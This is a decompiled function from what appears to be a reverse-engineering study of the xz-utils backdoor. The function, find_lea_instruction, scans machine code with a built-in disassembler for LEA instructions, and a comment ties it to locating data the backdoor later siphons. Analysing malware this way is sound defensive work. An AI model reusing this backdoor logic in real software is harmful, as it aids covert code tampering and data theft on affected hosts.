// /home/kali/xzre-ghidra/xzregh/100EB0_find_lea_instruction.c
// Function: find_lea_instruction @ 0x100EB0
// Calling convention: unknown
// Prototype: undefined find_lea_instruction(void)


/*
 * AutoDoc: Finds the next LEA instruction in the stream and returns operand details. The backdoor uses this to recover base-plus-offset calculations that point at data structures it later siphons.
 */
#include "xzre_types.h"


undefined8 find_lea_instruction(ulong param_1,ulong param_2,long param_3)

{
  int iVar1;
  long lVar2;
  undefined4 *puVar3;
  byte bVar4;
  undefined4 dctx [4];
  byte local_6f;
  int local_58;
  long local_50;
  
  bVar4 = 0;
  iVar1 = secret_data_append_from_call_site(0x7c,5,6,0);
  if (iVar1 != 0) {
    puVar3 = dctx;
    for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
      *puVar3 = 0;
      puVar3 = puVar3 + (ulong)bVar4 * -2 + 1;
    }
    for (; param_1 < param_2; param_1 = param_1 + 1) {
      iVar1 = x86_dasm(dctx,param_1,param_2);
      if ((((iVar1 != 0) && (local_58 == 0x10d)) && ((local_6f & 7) == 1)) &&
         ((local_50 == param_3 || (local_50 == -param_3)))) {
        return 1;
      }
    }
  }
  return 0;
}

